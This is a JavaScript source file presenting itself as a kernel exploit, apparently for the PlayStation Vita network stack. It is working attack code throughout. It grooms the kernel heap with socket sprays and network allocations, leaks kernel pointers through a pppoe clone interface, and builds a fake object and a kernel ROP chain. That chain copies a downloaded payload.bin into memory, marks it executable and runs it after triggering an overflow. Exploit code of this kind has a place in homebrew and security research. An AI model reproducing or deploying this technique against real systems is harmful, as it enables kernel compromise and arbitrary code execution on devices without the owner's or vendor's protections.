/* exploit.js -- implementation of the kernel exploit
 *
 * Copyright (C) 2020 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX = 0x1020d005
SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW = 0x1020d006

SCE_NET_AF_INET    = 2
SCE_NET_SOCK_DGRAM = 2

SIOCDIFADDR   = 0x80206919
SIOCAIFADDR   = 0x8040691a
SIOCIFDESTROY = 0x80206979
SIOCIFCREATE  = 0x8020697a

SIZEOF_SIN = 0x10

PLANT_SIZE = 0x4000
DUMMY_SIZE = 0x4000
SOFTC_SIZE = 0x550
SPLIT_SIZE = 0x148
SPRAY_SIZE = 0xc8
HOLE_SIZE  = 0x80
IF_SIZE    = 0x140

NUM_SPRAY  = 0x100
NUM_SOCKS  = 0x80
NUM_SLOTS  = 0x04

function load_binary_resource(url) {
  var req = new XMLHttpRequest();
  req.open('GET', url, false);
  req.overrideMimeType('text\/plain; charset=x-user-defined');
  req.send(null);
  if (req.status != 200) return '';
  return req.responseText;
}

function inet_addr(str) {
  var ip_list = str.split(".").reverse();
  var a1 = parseInt(ip_list[0]);
  var a2 = parseInt(ip_list[1]);
  var a3 = parseInt(ip_list[2]);
  var a4 = parseInt(ip_list[3]);

  var addr = ((a1 << 24) | (a2 << 16) | (a3 << 8) | a4) >>> 0;
  return addr;
}

function if_add_addr(sock, name, addr, dstaddr, mask) {
  var ifr = allocate_memory(0x40);
  mymemset(ifr, 0, 0x40);

  mymemcpy(ifr, name, name.length);

  aspace[(ifr + 0x10) / 1]   = SIZEOF_SIN;
  aspace[(ifr + 0x11) / 1]   = SCE_NET_AF_INET;
  aspace32[(ifr + 0x14) / 4] = addr;

  aspace[(ifr + 0x20) / 1]   = SIZEOF_SIN;
  aspace[(ifr + 0x21) / 1]   = SCE_NET_AF_INET;
  aspace32[(ifr + 0x24) / 4] = dstaddr;

  aspace[(ifr + 0x30) / 1]   = SIZEOF_SIN;
  aspace[(ifr + 0x31) / 1]   = SCE_NET_AF_INET;
  aspace32[(ifr + 0x34) / 4] = mask;

  return sceNetSyscallIoctl(sock, SIOCAIFADDR, ifr);
}

function if_del_addr(sock, name, addr) {
  var ifr = allocate_memory(0x20);
  mymemset(ifr, 0, 0x20);

  mymemcpy(ifr, name, name.length);

  aspace[(ifr + 0x10) / 1]   = SIZEOF_SIN;
  aspace[(ifr + 0x11) / 1]   = SCE_NET_AF_INET;
  aspace32[(ifr + 0x14) / 4] = addr;

  return sceNetSyscallIoctl(sock, SIOCDIFADDR, ifr);
}

function if_clone_create(sock, name) {
  var ifr = allocate_memory(0x20);
  mymemset(ifr, 0, 0x20);
  mymemcpy(ifr, name, name.length);
  return sceNetSyscallIoctl(sock, SIOCIFCREATE, ifr);
}

function if_clone_destroy(sock, name) {
  var ifr = allocate_memory(0x20);
  mymemset(ifr, 0, 0x20);
  mymemcpy(ifr, name, name.length);
  return sceNetSyscallIoctl(sock, SIOCIFDESTROY, ifr);
}

function net_malloc(slot, size) {
  var args = allocate_memory(0x08);
  aspace32[(args + 0x00) / 4] = slot;
  aspace32[(args + 0x04) / 4] = size;
  return sceNetSyscallControl(-1, 0x20000008, args, 0x08);
}

function net_free(slot) {
  var args = allocate_memory(0x08);
  aspace32[(args + 0x00) / 4] = slot;
  aspace32[(args + 0x04) / 4] = 0;
  return sceNetSyscallControl(-1, 0x20000009, args, 0x08);
}

function RopChain(buf, buf_addr) {
  this.chain = [];
  this.sysmem_offsets = [];
  this.sysmem_gadgets = [];

  this.push = function(gadget) {
    this.chain.push(gadget);
  };

  this.push_sysmem = function(gadget) {
    this.sysmem_offsets.push(this.chain.length * 4);
    this.sysmem_gadgets.push(gadget);
    this.push(0xDEADBEEF);
  };

  this.compile = function() {
    var resolve_stub_size = this.sysmem_offsets.length * 16 * 4;

    for (var i = 0; i < this.sysmem_offsets.length; i++) {
      var offset = buf_addr + resolve_stub_size + this.sysmem_offsets[i];
      var gadget = SceSysmem_base_off + this.sysmem_gadgets[i];

      var resolve_stub = [
        movs_r0_0_pop_r3_pc,                                // pc
        ksceKernelFreeMemBlock,                             // r3
        blx_r3_pop_r3_pc,                                   // pc
        0xDEADBEEF,                                         // r3
        push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc, // pc
        0xDEADBEEF,                                         // r6
        0xDEADBEEF,                                         // r0
        offset,                                             // r1
        add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr,                // r3
        gadget,                                             // r4
        0xDEADBEEF,                                         // r5
        0xDEADBEEF,                                         // r6
        blx_r3_pop_r3_pc,                                   // pc
        0xDEADBEEF,                                         // r4
        0xDEADBEEF,                                         // r5
        0xDEADBEEF,                                         // r3
      ];

      Array.prototype.unshift.apply(this.chain, resolve_stub);
    }

    for (var i = 0; i < this.chain.length; i++) {
      aspace32[(buf + i * 4) / 4] = this.chain[i];
    }
  }
}

function build_krop(buf, buf_addr, payload, payload_size) {
  var krop = new RopChain(buf, buf_addr);

  var payload_code_blockid = buf_addr + 0x00;
  var payload_code_block = buf_addr + 0x04;

  // Allocate code block
  krop.push(pop_r0_r1_r2_r3_r4_r6_pc);                 // pc
  krop.push(empty_string);                             // r0
  krop.push(SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW);       // r1
  krop.push((payload_size + 0xfff) & ~0xfff);          // r2
  krop.push(0);                                        // r3
  krop.push(ksceKernelAllocMemBlock);                  // r4
  krop.push(0xDEADBEEF);                               // r6
  krop.push(blx_r4_add_sp_c_pop_r4_r5_pc);             // pc
  krop.push(0xDEADBEEF);                               // dummy
  krop.push(0xDEADBEEF);                               // dummy
  krop.push(0xDEADBEEF);                               // dummy
  krop.push(payload_code_blockid);                     // r4
  krop.push(0xDEADBEEF);                               // r5
  krop.push(str_r0_r4_pop_r4_pc);                      // pc
  krop.push(0xDEADBEEF);                               // r4

  // Get code block
  krop.push(pop_r0_r1_r2_r3_r4_r6_pc);                 // pc
  krop.push(0xDEADBEEF);                               // r0
  krop.push(payload_code_block);                       // r1
  krop.push(0xDEADBEEF);                               // r2
  krop.push(ksceKernelGetMemBlockBase);                // r4
  krop.push(payload_code_blockid);                     // r4
  krop.push(0xDEADBEEF);                               // r6
  krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
  krop.push(0xDEADBEEF);                               // r4
  krop.push(blx_r3_pop_r3_pc);                         // pc
  krop.push(0xDEADBEEF);                               // r3

  // Copy payload from user to code block
  krop.push(pop_r0_r1_r2_r3_r4_r6_pc);                 // pc
  krop.push(0xDEADBEEF);                               // r0
  krop.push(payload);                                  // r1
  krop.push(payload_size);                             // r2
  krop.push(ksceKernelMemcpyUserToKernel);             // r3
  krop.push(payload_code_block);                       // r4
  krop.push(0xDEADBEEF);                               // r6
  krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
  krop.push(0xDEADBEEF);                               // r4
  krop.push(blx_r3_pop_r3_pc);                         // pc
  krop.push(0xDEADBEEF);                               // r3

  // Mark code block as executable
  krop.push(pop_r0_r1_r2_r3_r4_r6_pc);                 // pc
  krop.push(0xDEADBEEF);                               // r0
  krop.push(SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX);       // r1
  krop.push(0xDEADBEEF);                               // r2
  krop.push_sysmem(ksceKernelRemapBlock);              // r3
  krop.push(payload_code_blockid);                     // r4
  krop.push(0xDEADBEEF);                               // r6
  krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
  krop.push(0xDEADBEEF);                               // r4
  krop.push(blx_r3_pop_r3_pc);                         // pc
  krop.push(0xDEADBEEF);                               // r3

  // Clean cache
  krop.push(pop_r0_r1_r2_r3_r4_r6_pc);                 // pc
  krop.push(0xDEADBEEF);                               // r0
  krop.push((payload_size + 0x1f) & ~0x1f);            // r1
  krop.push(0xDEADBEEF);                               // r2
  krop.push_sysmem(ksceKernelCpuDcacheWritebackRange); // r3
  krop.push(payload_code_block);                       // r4
  krop.push(0xDEADBEEF);                               // r6
  krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
  krop.push(0xDEADBEEF);                               // r4
  krop.push(blx_r3_pop_r3_pc);                         // pc
  krop.push(0xDEADBEEF);                               // r3

  // Execute payload
  krop.push(pop_r0_r1_r2_r3_r4_r6_pc);                 // pc
  krop.push(0xDEADBEEF);                               // r0
  krop.push_sysmem(0);                                 // r1
  krop.push(iflist_addr);                              // r2
  krop.push(1);                                        // r3
  krop.push(payload_code_block);                       // r4
  krop.push(0xDEADBEEF);                               // r6
  krop.push(ldr_r0_r4_pop_r4_pc);                      // pc
  krop.push(0xDEADBEEF);                               // r4
  krop.push(orrs_r0_r3_pop_r3_pc);                     // pc
  krop.push(0xDEADBEEF);                               // r3
  krop.push(blx_r0_pop_r3_pc);                         // pc

  // Compile kernel ROP chain
  krop.compile();
}

function kxploit(caller, ver) {
  // Fetch kernel payload
  var payload = load_binary_resource("payload.bin");
  var payload_size = payload.length;
  var payload_buf = malloc(payload_size);
  mymemcpy(payload_buf, payload, payload_size);

  // Empty string
  var sockname = allocate_memory(0x04);
  aspace32[sockname / 4] = 0;

  // Initialize socket
  var sock = sceNetSyscallSocket(
    sockname, SCE_NET_AF_INET, SCE_NET_SOCK_DGRAM, 0);

  // Destroy clone interface
  if_clone_destroy(sock, "pppoe1337");

  // Get 2nd interface name
  var iflist = allocate_memory(2 * IF_SIZE);
  sceNetSyscallGetIfList(iflist, 2);
  var ifname = read_string(iflist + IF_SIZE);

  // Delete custom address
  if_del_addr(sock, ifname, 0x13371337);

  // Free all slots
  for (var i = 0; i < NUM_SLOTS; i++)
    net_free(i);

  // Reserve memory for heap feng shui
  net_malloc(0, 0x8710);

  // Heap grooming
  var buf = allocate_memory(SPRAY_SIZE);
  mymemset(buf, 0, SPRAY_SIZE);

  var sin = allocate_memory(SIZEOF_SIN);
  mymemset(sin, 0, 0x10);
  aspace[(sin + 0x00) / 1]   = SIZEOF_SIN;
  aspace[(sin + 0x01) / 1]   = SCE_NET_AF_INET;
  aspace16[(sin + 0x02) / 2] = sceNetHtons(8888);
  aspace32[(sin + 0x04) / 4] = inet_addr("127.0.0.1");
  sceNetSyscallBind(sock, sin, SIZEOF_SIN);

  var iov = allocate_memory(0x08);
  aspace32[(iov + 0x00) / 4] = buf;        // iov_base
  aspace32[(iov + 0x04) / 4] = SPRAY_SIZE; // iov_len

  var msg = allocate_memory(0x1c);
  aspace32[(msg + 0x00) / 4] = sin;        // msg_name
  aspace32[(msg + 0x04) / 4] = SIZEOF_SIN; // msg_namelen
  aspace32[(msg + 0x08) / 4] = iov;        // msg_iov
  aspace32[(msg + 0x0c) / 4] = 1;          // msg_iovlen
  aspace32[(msg + 0x10) / 4] = 0;          // msg_control
  aspace32[(msg + 0x14) / 4] = 0;          // msg_controllen
  aspace32[(msg + 0x18) / 4] = 0;          // msg_flags

  for (var i = 0; i < NUM_SPRAY; i++)
    sceNetSyscallSendmsg(sock, msg, 0);

  var spray_sock = [];
  for (var i = 0; i < NUM_SOCKS; i++)
    spray_sock[i] = sceNetSyscallSocket(
      sockname, SCE_NET_AF_INET, SCE_NET_SOCK_DGRAM, 0);

  // Heap feng shui
  // 0x20+0x4000+0x8+0x20+0x148+0x8+0x20+0x550+0x8+0x20+0x4000+0x8
  net_free(0);
  net_malloc(0, 0x6e8 + PLANT_SIZE);
  net_malloc(3, DUMMY_SIZE); // prevent hole from coalescing
  net_free(0);
  net_malloc(0, PLANT_SIZE);
  net_malloc(1, SOFTC_SIZE);
  net_malloc(2, SPLIT_SIZE);

  // Allocate plant buffer
  var plant_buf = malloc(PLANT_SIZE);
  mymemset(plant_buf, 0, PLANT_SIZE);

  // Leak clone interface and chunk header
  var softc_leak = plant_buf + 0x2000;

  net_free(1);
  if_clone_create(sock,  "pppoe1337");
  if_clone_destroy(sock, "pppoe1337");
  net_malloc(1, SOFTC_SIZE - 0x80);
  net_free(1);
  sceNetSyscallControl(-1, 0x14, softc_leak, SOFTC_SIZE);

  // Create clone interface
  if_clone_create(sock, "pppoe1337");

  // Check for validity
  if (read_string(softc_leak + 0x14) != "pppoe1337" ||
      aspace32[(softc_leak + 0x6c) / 4] != SOFTC_SIZE - 0x80) {
    if_clone_destroy(sock, "pppoe1337");
    for (var i = 0; i < NUM_SLOTS; i++)
      net_free(i);
    for (var i = 0; i < NUM_SOCKS; i++)
      sceNetSyscallClose(spray_sock[i]);
    sceNetSyscallClose(sock);
    alert("ERROR: Could not leak heap memory.");
    return -1;
  }

  // Obtain kernel pointers
  netps_base  = aspace32[(softc_leak + 0x64) / 4] + SceNetPs_base_off;
  iflist_addr = aspace32[(softc_leak + 0x74) / 4] - 0x150;

  // Initialize kernel ROP gadgets
  var ex_bases = {
    "SceNetPs": netps_base,
  };

  init_ggts(ex_bases, caller, ver);

  // Fake object
  var fake = plant_buf + 0x1000;
  var fake_addr = iflist_addr + 0x6e8 + 0x1000;

  aspace32[(fake + 0x00) / 4] = fake_addr + 0x00;  // r0
  aspace32[(fake + 0x04) / 4] = 0xDEADBEEF;        // r1
  aspace32[(fake + 0x08) / 4] = 0xDEADBEEF;        // r2
  aspace32[(fake + 0x0c) / 4] = 0xDEADBEEF;        // r3
  aspace32[(fake + 0x10) / 4] = 0xDEADBEEF;        // r4
  aspace32[(fake + 0x14) / 4] = 0xDEADBEEF;        // ip
  aspace32[(fake + 0x18) / 4] = fake_addr + 0x100; // sp
  aspace32[(fake + 0x1c) / 4] = 0xDEADBEEF;        // lr
  aspace32[(fake + 0x20) / 4] = pop_pc;            // pc
  aspace32[(fake + 0x34) / 4] = fake_addr + 0x00;  // any valid address
  aspace32[(fake + 0x50) / 4] = ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc; // func
  aspace32[(fake + 0x58) / 4] = 1;

  // Build kernel ROP chain
  build_krop(fake + 0x100, fake_addr + 0x100, payload_buf, payload_size);

  // Plant data
  net_free(0);
  sceNetSyscallControl(-1, 0x20000000, plant_buf, PLANT_SIZE);
  net_malloc(0, PLANT_SIZE);

  // Prepare corruption
  if_add_addr(sock, ifname, 0x13371337, fake_addr, 0);

  // Create hole
  net_free(2);
  net_malloc(2, SPLIT_SIZE - HOLE_SIZE - 0x28);

  // Trigger overflow and code execution
  sceNetSyscallGetIfList(iflist, 0x0199999a);

  return 0;
}
